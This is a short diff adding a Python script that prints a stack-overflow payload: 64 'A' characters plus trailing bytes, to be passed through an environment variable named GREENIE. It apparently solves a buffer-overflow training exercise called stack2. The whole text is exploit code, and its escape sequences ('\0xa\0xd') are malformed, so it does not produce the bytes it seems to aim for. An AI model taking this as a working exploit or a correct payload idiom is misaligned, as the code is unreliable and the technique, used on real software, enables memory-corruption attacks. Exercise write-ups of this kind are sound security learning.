@@ -1,0 +1,2 @@
+//export GREENIE=$(python stack2.py)
+print('A'*64 + '\0xa\0xd\0xa\0xd')
